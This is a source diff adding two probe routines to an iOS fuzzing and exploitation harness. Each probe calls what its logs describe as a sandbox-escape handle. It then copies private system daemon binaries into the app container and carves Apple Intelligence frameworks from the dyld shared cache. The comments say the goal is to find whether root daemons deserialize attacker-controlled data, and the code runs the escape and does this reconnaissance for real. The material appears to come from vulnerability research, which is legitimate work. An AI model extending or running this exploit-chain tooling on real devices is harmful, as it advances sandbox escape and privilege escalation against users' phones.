@@ -27786,10 +27786,19 @@ static void p_bq14(void) {
     // --- SUB-FILE SCAN: each sub-cache carries its own mappings; a hit's
     // file offset translates to an in-cache address through THEM, then
     // to an image path through the head's table.
+    // The last needle is the consumer oracle: LC_LOAD_DYLIB stores the
+    // linked framework's path in each image's load commands, which live
+    // IN the cache — so every cache image importing
+    // AppIntentsLiveEntitySupport (the client library with
+    // ReaderActor/WriterActor wrappers, bq20-strings) surfaces here.
+    // Consumer daemons themselves are /usr/libexec (unreadable, §182),
+    // but the frameworks they load are not.
     const char *needles[] = { "feedEntries", "feedMetadata",
                               "lnValue", "feedId",
-                              "LiveEntityService" };
-    const unsigned nneedles = 5;
+                              "LiveEntityService",
+                              "AppIntentsLiveEntitySupport.framework/"
+                              "AppIntentsLiveEntitySupport" };
+    const unsigned nneedles = 6;
     int totalHits = 0;
     // Distinct attributed images per needle: the DB schema's real owner
     // must USE these column names in code, so the image set matters more
@@ -28844,6 +28853,333 @@ static void p_bq19(void) {
     LOG("[bq19] done");
     fsync(fileno(stderr));
     bad_query_release(h);
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq20): exfiltrate the owner's binary for offline analysis.
+//
+// bq16 answered WHAT the service does (SQL over our tables, LNValue
+// decoder) from byte contexts; the remaining questions need control
+// flow — WHEN it iterates feedEntries (service start? per XPC request?)
+// and what the client protocol methods look like. The binary is
+// on-disk and readable (bq15 opened it),493 KB, so the cheapest path
+// is a byte copy into Documents and analysis on the Mac (otool/IDA),
+// not on-device guessing. READ-ONLY against the system; the only write
+// is our own container.
+// ---------------------------------------------------------------------------
+
+static void p_bq20(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq20] v177 export LiveEntityService binary for offline RE");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq20] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq20] done"); return; }
+
+    // The service PLUS its four known clients (bq17): client binaries
+    // contain the protocol's method names in cleartext — the service
+    // side only has the handler dispatch, which is what control-flow
+    // analysis must be aimed at later.
+    NSDictionary *copies = @{
+        @"svc.bin": @"/System/Library/PrivateFrameworks/"
+            "AppIntentsLiveEntitySupport.framework/XPCServices/"
+            "AppIntentsLiveEntityService.xpc/AppIntentsLiveEntityService",
+        @"cli-callservicesd.bin": @"/System/Library/PrivateFrameworks/"
+            "TelephonyUtilities.framework/callservicesd",
+        @"cli-mediaremoted.bin": @"/System/Library/PrivateFrameworks/"
+            "MediaRemote.framework/Support/mediaremoted",
+        @"cli-navd.bin": @"/System/Library/PrivateFrameworks/"
+            "MapsSupport.framework/navd",
+        @"cli-mobiletimerd.bin": @"/System/Library/PrivateFrameworks/"
+            "MobileTimer.framework/Executables/mobiletimerd",
+    };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    for (NSString *name in copies) {
+        NSString *src = copies[name];
+        struct stat st = {0};
+        if (stat(src.fileSystemRepresentation, &st) != 0) {
+            LOG("[bq20] %s: stat errno %d — skipped", name.UTF8String, errno);
+            continue;
+        }
+        NSString *dst = [docs stringByAppendingPathComponent:name];
+        NSError *err = nil;
+        [[NSFileManager defaultManager] removeItemAtPath:dst error:NULL];
+        if (![[NSFileManager defaultManager] copyItemAtPath:src
+                    toPath:dst error:&err]) {
+            LOG("[bq20] %s: copy FAILED: %s", name.UTF8String,
+                err.localizedDescription.UTF8String);
+            continue;
+        }
+        struct stat st2 = {0};
+        stat(dst.fileSystemRepresentation, &st2);
+        NSData *a = [NSData dataWithContentsOfFile:src];
+        NSData *b = [NSData dataWithContentsOfFile:dst];
+        // Read-back verification: analysis on the Mac of bytes that
+        // differ from the source would be analysis of a phantom.
+        LOG("[bq20] %s: %lld -> %lld bytes, byte-identical=%d",
+            name.UTF8String, (long long)st.st_size,
+            (long long)st2.st_size,
+            (a && b && [a isEqualToData:b]) ? 1 : 0);
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq20] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq21): carve the CONSUMER-side frameworks out of the split
+// dyld cache.
+//
+// bq14's LC_LOAD_DYLIB oracle named the importers of the client
+// library: IntelligenceFlowContextRuntime / IntelligenceFlowPlannerRuntime
+// (the Apple-Intelligence runtimes — loaded by root daemons such as
+// intelligencecontextd) plus the support framework itself. Offline RE
+// of the service (bq20, results/liveentity) showed its own
+// "Found nil when unarchiving LNValue" / "Finished iterating over
+// feedEntries DB" sit inside the sqlite iteration window — the SERVICE
+// decodes rows while serving them. The open question: does the
+// CONSUMER unarchive attacker-controlled lnValue bytes too (NSXPC
+// re-encode would move the deserializer into a root process)?
+//
+// Method: read the images table bq14 brute-forced (stride 32,
+// pathSlot 3, addrSlot 0) — but re-VALIDATE it here with the same
+// three path probes: a hardcoded layout is a guess, and an unvalidated
+// table is not an oracle (§144). Image size = distance to the
+// next-higher image address (correct even if the table is unsorted).
+// Sub-file translation uses pread on mapping headers only — never an
+// mmap of a 130 MB sub-cache. Every carve is read back and compared
+// byte-for-byte, then scanned on-device for the decoder strings: the
+// verdict is in the log even if the pull never happens.
+// ---------------------------------------------------------------------------
+
+static void p_bq21(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq21] v177 carve consumer frameworks from dyld split cache");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq21] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq21] done"); return; }
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs) / sizeof(candirs[0]) && !cdir[0];
+         i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) { LOG("[bq21] dir %s: errno %d", candirs[i], errno); continue; }
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]);
+                break;
+            }
+        closedir(pd);
+        if (cdir[0]) LOG("[bq21] cache dir %s", cdir);
+    }
+    if (!cdir[0]) {
+        LOG("[bq21] no dyld cache dir — route closed");
+        bad_query_release(h); LOG("[bq21] done"); return;
+    }
+
+    NSMutableArray *subs = [NSMutableArray array];
+    NSString *headFile = nil;
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    while (cd && (ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        struct stat st;
+        if (stat(p, &st) == 0 && S_ISREG(st.st_mode)) {
+            [subs addObject:[NSString stringWithUTF8String:p]];
+            if (!strchr(ce->d_name, '.'))
+                headFile = [NSString stringWithUTF8String:p];
+        }
+    }
+    if (cd) closedir(cd);
+    if (subs.count == 0) {
+        LOG("[bq21] no sub-files — route closed");
+        bad_query_release(h); LOG("[bq21] done"); return;
+    }
+    if (!headFile) headFile = subs[0];
+    LOG("[bq21] head %s, %d sub-files", headFile.lastPathComponent.UTF8String,
+        (int)subs.count);
+    fsync(fileno(stderr));
+
+    int fd = open(headFile.fileSystemRepresentation, O_RDONLY);
+    struct stat cst;
+    fstat(fd, &cst);
+    uint64_t fsize = (uint64_t)cst.st_size;
+    void *map = mmap(NULL, (size_t)fsize, PROT_READ, MAP_FILE | MAP_PRIVATE,
+                     fd, 0);
+    if (fd < 0 || map == MAP_FAILED) {
+        LOG("[bq21] head open/mmap errno %d — route closed", errno);
+        if (fd >= 0) close(fd);
+        bad_query_release(h); LOG("[bq21] done"); return;
+    }
+    struct bq14_cache_header *hdr = (struct bq14_cache_header *)map;
+    if (memcmp(hdr->magic, "dyld_v1", 7) != 0) {
+        LOG("[bq21] head bad magic — route closed");
+        munmap(map, (size_t)fsize); close(fd);
+        bad_query_release(h); LOG("[bq21] done"); return;
+    }
+
+    // Re-validate the images table: header u32 pairs, stride 32,
+    // path at u64 slot 3 — three path probes (first/middle/last).
+    uint32_t imgOff = 0, imgCnt = 0;
+    BOOL found = NO;
+    for (uint32_t o4 = 0x18; o4 + 8 <= hdr->mappingOffset && !found; o4 += 4) {
+        uint32_t o = ((uint32_t *)((char *)hdr + o4))[0];
+        uint32_t c = ((uint32_t *)((char *)hdr + o4))[1];
+        if (c < 100 || c > 40000) continue;
+        if (!o || (uint64_t)o + (uint64_t)c * 32 > fsize) continue;
+        BOOL ok = YES;
+        for (int probe = 0; probe < 3 && ok; probe++) {
+            uint32_t idx = probe == 0 ? 0 : (probe == 1 ? c / 2 : c - 1);
+            uint64_t raw[4] = {0, 0, 0, 0};
+            memcpy(raw, (char *)map + o + (uint64_t)idx * 32, 32);
+            char pth[256];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) ok = NO;
+        }
+        if (ok) { imgOff = o; imgCnt = c; found = YES; }
+    }
+    if (!found) {
+        LOG("[bq21] images table re-validation FAILED — no blind carve");
+        munmap(map, (size_t)fsize); close(fd);
+        bad_query_release(h); LOG("[bq21] done"); return;
+    }
+    LOG("[bq21] images table re-validated: off=0x%x cnt=%u stride=32 pathSlot=3",
+        imgOff, imgCnt);
+    fsync(fileno(stderr));
+
+    const char *targets[] = {
+        "/System/Library/PrivateFrameworks/AppIntentsLiveEntitySupport.framework/"
+            "AppIntentsLiveEntitySupport",
+        "/System/Library/PrivateFrameworks/IntelligenceFlowContextRuntime.framework/"
+            "IntelligenceFlowContextRuntime",
+        "/System/Library/PrivateFrameworks/IntelligenceFlowPlannerRuntime.framework/"
+            "IntelligenceFlowPlannerRuntime",
+    };
+    const char *needles[] = {
+        "unarchiving LNValue", "NSKeyedUnarchiver", "unarchiveTopLevelObject",
+        "LiveEntityService", "ReaderActor",
+    };
+    const unsigned nneedles = 5;
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    for (unsigned t = 0; t < 3; t++) {
+        NSString *targ = [NSString stringWithUTF8String:targets[t]];
+        uint64_t addr = 0;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0, 0, 0, 0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            char pth[300];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) continue;
+            if (strcmp(pth, targets[t]) == 0) { addr = raw[0]; break; }
+        }
+        if (!addr) {
+            LOG("[bq21] target NOT in images table: %s", targets[t]);
+            continue;
+        }
+        // Size: distance to the next HIGHER image address (robust to
+        // table ordering), capped at 64 MB.
+        uint64_t next = ~0ULL;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0, 0, 0, 0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            if (raw[0] > addr && raw[0] < next) next = raw[0];
+        }
+        uint64_t want = (next == ~0ULL ? 0x4000000ULL : next - addr);
+        if (want > 0x4000000ULL) want = 0x4000000ULL;
+        LOG("[bq21] %s @0x%llx want=%llu bytes",
+            targ.lastPathComponent.UTF8String,
+            (unsigned long long)addr, (unsigned long long)want);
+        fsync(fileno(stderr));
+
+        // Translate addr -> (sub-file, file offset) via mapping headers.
+        BOOL carved = NO;
+        for (NSString *sf in subs) {
+            int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
+            if (sfd < 0) continue;
+            struct bq14_cache_header sh = {0};
+            if (pread(sfd, &sh, sizeof(sh), 0) != sizeof(sh) ||
+                memcmp(sh.magic, "dyld_v1", 7) != 0 ||
+                sh.mappingCount > 64 || sh.mappingOffset > (1u << 20)) {
+                close(sfd); continue;
+            }
+            struct bq14_mapping_info mm[64];
+            memset(mm, 0, sizeof(mm));
+            if (pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
+                      sh.mappingOffset) !=
+                (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info))) {
+                close(sfd); continue;
+            }
+            for (uint32_t m = 0; m < sh.mappingCount; m++) {
+                if (addr < mm[m].address ||
+                    addr >= mm[m].address + mm[m].size) continue;
+                uint64_t fo = mm[m].fileOffset + (addr - mm[m].address);
+                uint64_t avail = mm[m].size - (addr - mm[m].address);
+                uint64_t n = want < avail ? want : avail;
+                unsigned char *buf = (unsigned char *)malloc((size_t)n);
+                ssize_t got = pread(sfd, buf, (size_t)n, (off_t)fo);
+                close(sfd);
+                if (got != (ssize_t)n) {
+                    LOG("[bq21] pread short (%zd/%llu) — skipped", got,
+                        (unsigned long long)n);
+                    free(buf);
+                    break;
+                }
+                NSString *out = [docs stringByAppendingPathComponent:
+                    [NSString stringWithFormat:@"carve-%@.bin",
+                     targ.lastPathComponent]];
+                NSData *dd = [NSData dataWithBytes:buf length:(NSUInteger)n];
+                [dd writeToFile:out atomically:NO];
+                NSData *back = [NSData dataWithContentsOfFile:out];
+                LOG("[bq21] carved %s: %llu bytes from %s @0x%llx, "
+                    "byte-identical=%d",
+                    out.lastPathComponent.UTF8String,
+                    (unsigned long long)n, sf.lastPathComponent.UTF8String,
+                    (unsigned long long)fo,
+                    (back && [back isEqualToData:dd]) ? 1 : 0);
+                // On-device verdict: decoder strings present in THIS image?
+                for (unsigned k = 0; k < nneedles; k++) {
+                    void *hit = memmem(buf, (size_t)n, needles[k],
+                                       strlen(needles[k]));
+                    LOG("[bq21]   needle %-24s %s", needles[k],
+                        hit ? "FOUND" : "absent");
+                }
+                fsync(fileno(stderr));
+                free(buf);
+                carved = YES;
+                break;
+            }
+            if (carved) break;
+        }
+        if (!carved)
+            LOG("[bq21] NO mapping covers @0x%llx — carve failed",
+                (unsigned long long)addr);
+        fsync(fileno(stderr));
+    }
+
+    munmap(map, (size_t)fsize);
+    close(fd);
+    bad_query_release(h);
+    LOG("[bq21] done");
 }
 
 // ---------------------------------------------------------------------------
@@ -33356,6 +33692,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ17")) { p_bq17(); LOG("[probe13] bq17-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ18")) { p_bq18(); LOG("[probe13] bq18-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ19")) { p_bq19(); LOG("[probe13] bq19-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ20")) { p_bq20(); LOG("[probe13] bq20-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ21")) { p_bq21(); LOG("[probe13] bq21-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
